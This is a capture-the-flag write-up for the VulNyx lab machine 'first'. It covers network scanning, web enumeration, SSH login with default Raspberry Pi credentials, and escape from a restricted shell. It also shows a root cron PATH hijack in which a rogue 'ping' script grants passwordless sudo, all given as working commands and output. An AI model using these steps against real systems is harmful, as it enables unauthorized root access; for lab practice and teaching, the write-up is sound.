# first

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| first | d4t4s3c | Low | VulNyx |

**Summary:** The first machine exposed three network services: OpenSSH on port 22, an Apache web server on port 80, and the Erlang Port Mapper Daemon (epmd) on port 4369. Web directory fuzzing discovered a `tasklist` file referencing a pending update on a Raspberry Pi device, hinting at the presence of default hardware credentials. Connecting over SSH using the default Raspberry Pi pair `pi:raspberry` succeeded but dropped into a restricted shell environment (`rbash`). An SSH command execution trick using `ssh pi@localhost -t 'bash --noprofile'` successfully bypassed the restricted shell and spawned an unrestricted bash prompt. Internal enumeration of `/etc/crontab` revealed a root cron job executing `ping -c1 raspberrypi.com` every minute with a hijacked `PATH` configuration containing the world writable directory `/var/www/html` ahead of standard system binary directories. Placing a malicious executable script named `ping` inside `/var/www/html` resulted in arbitrary command execution as root, appending unrestricted sudo permissions to `/etc/sudoers` and enabling an instant root shell via `sudo -i`.

---

## Reconnaissance

The engagement commenced with a network sweep across the local subnet to identify the active target IP address.

1. An Nmap host discovery scan located the machine at `192.168.56.122`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:37 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00042s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0021s latency).
MAC Address: 08:00:27:43:2D:48 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.122 (192.168.56.122)
Host is up (0.0012s latency).
MAC Address: 08:00:27:37:91:03 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.03 seconds
                                                                                                                     
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.122
```

2. A full TCP port scan was performed to detect all open ports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=5000 -Pn $ip 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:37 -0400
Nmap scan report for 192.168.56.122 (192.168.56.122)
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4369/tcp open  epmd
MAC Address: 08:00:27:37:91:03 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.69 seconds
```

3. Service enumeration and script detection were run against the discovered services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80,4369 -sC -sV -T4 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:38 -0400
Nmap scan report for 192.168.56.122 (192.168.56.122)
Host is up (0.00058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 24:83:97:49:96:11:7c:7a:54:00:17:3b:0c:f6:e1:54 (RSA)
|   256 83:cc:d0:72:41:48:fc:c4:ba:46:a1:0e:70:50:52:71 (ECDSA)
|_  256 a0:37:99:32:78:17:69:4f:1d:ac:75:1e:ba:19:58:45 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|_  nodes: 
MAC Address: 08:00:27:37:91:03 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.12 seconds
```

4. Directory and file brute forcing was executed against the web server on port 80:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ gobuster dir -u http://$ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.122/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10701]
tasklist             (Status: 200) [Size: 137]
```

5. The content of `/tasklist` was retrieved to evaluate any operational notes:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl http://$ip/tasklist -s                 
[Task List]


[x] Go shopping.
[x] Make coffe.
[v] Update Raspberry.
[x] Go hairdresser.
[x] Request salary increase.
[x] Clean my room.
```

The task list included a checked entry indicating an update task on a Raspberry Pi device.

---

## Initial Access

### Default Credentials and Restricted Shell Escape

6. Given the Raspberry Pi clue, default credentials `pi:raspberry` were tested against the OpenSSH service:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ssh pi@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pi@192.168.56.122's password: 

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberry:~ $ id;hostname
uid=1000(pi) gid=1000(pi) grupos=1000(pi)
raspberry
pi@raspberry:~ $ 
```

7. Inspecting the environment revealed that the user was assigned a restricted shell (`rbash`), preventing standard directory traversal:

```bash
pi@raspberry:~ $ cd /opt
-rbash: cd: restringido
pi@raspberry:~ $ echo $SHELL
/bin/rbash
```

8. The restricted shell was bypassed by re authenticating locally over SSH and forcing the allocation of a clean bash process without user profile restrictions:

```bash
pi@raspberry:~ $ ssh pi@localhost -t 'bash --noprofile'
pi@localhost's password: 
pi@raspberry:~ $ cd /opt
pi@raspberry:/opt $ 
```

---

## Privilege Escalation

### Exploiting PATH Hijacking in System Crontab

9. System configuration files and scheduled tasks were inspected to identify privilege escalation vectors:

```bash
pi@raspberry:/opt $ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 80176 feb  2  2021 /usr/bin/ping
-rwsr-xr-x 1 root root 66292 feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 217812 ene 14  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 43252 feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 79396 ene 20  2022 /usr/bin/su
pi@raspberry:/opt $ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/var/www/html:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root ping -c1 raspberrypi.com
```

The crontab defined a root cron job executing `ping -c1 raspberrypi.com` every minute. In the `PATH` variable, the web root `/var/www/html` was positioned before `/bin` and `/usr/bin`.

10. Checking permissions on `/var/www/html` showed that the web root directory was world writable:

```bash
pi@raspberry:/opt $ ls -la /var/www/html
total 24
drwxrwxrwx 2 www-data www-data  4096 ene  7  2024 .
drwxrwxrwx 3 www-data www-data  4096 nov 11  2023 ..
-rwxrwxrwx 1 www-data www-data 10701 nov 11  2023 index.html
-rwxrwxrwx 1 www-data www-data   137 ene  7  2024 tasklist
```

11. A malicious script named `ping` was created in `/var/www/html` to append a passwordless sudo rule for `pi` to `/etc/sudoers`:

```bash
pi@raspberry:/opt $ cat << 'EOF' >/var/www/html/ping
> #!/bin/bash
> echo 'pi ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
> EOF
pi@raspberry:/opt $ chmod +x /var/www/html/ping 
pi@raspberry:/opt $ sudo -l
Matching Defaults entries for pi on raspberry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=NO_AT_BRIDGE, env_keep+="http_proxy HTTP_PROXY", env_keep+="https_proxy HTTPS_PROXY",
    env_keep+="ftp_proxy FTP_PROXY", env_keep+=RSYNC_PROXY, env_keep+="no_proxy NO_PROXY"

User pi may run the following commands on raspberry:
    (ALL : ALL) NOPASSWD: ALL
pi@raspberry:/opt $ sudo -i

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

root@raspberry:~ # id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
raspberry
root@raspberry:~ # cat /home/pi/user.txt /root/root.txt 
```

The root cron job executed the rogue `ping` binary due to the manipulated `PATH` order. Once executed, `sudo -i` granted an immediate root shell and access to both flags.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning located the target at `192.168.56.122` and detected open services on ports 22 (SSH), 80 (HTTP), and 4369 (epmd).

2. **Vulnerability Discovery**: Web directory enumeration identified `/tasklist`, which disclosed a reference to a Raspberry Pi device and suggested default credentials.

3. **Exploitation**: The default credentials `pi:raspberry` were used to gain access via SSH. The restricted shell (`rbash`) was subsequently escaped using `ssh pi@localhost -t 'bash --noprofile'`.

4. **Internal Enumeration**: Reviewing `/etc/crontab` identified a root scheduled task running `ping` every minute with `/var/www/html` listed in `PATH` prior to standard system binary locations.

5. **Privilege Escalation**: Writing a rogue `ping` script into the world writable `/var/www/html` directory hijacked execution of the root cron task, granting full `NOPASSWD` sudo rights and root privileges.
